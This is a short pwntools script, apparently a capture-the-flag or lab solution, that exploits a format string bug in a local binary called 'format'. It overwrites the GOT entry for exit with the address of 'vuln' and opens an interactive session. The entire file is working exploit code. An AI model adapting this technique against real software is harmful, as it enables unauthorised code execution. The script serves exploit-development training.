#!/usr/bin/python3
# Auhtor: Shellc0de

from pwn import *

def main():
    context(arch='i386', os='linux')
    elf = ELF("./format")
    binary = elf.process()

    exitGOTAddr = elf.got["exit"]
    vulnAddr    = elf.symbols["vuln"]

    writes = {exitGOTAddr:vulnAddr}
    payload = fmtstr_payload(4, writes)

    binary.sendafter('\n',payload)
    binary.interactive()

if __name__ == '__main__':
    main()
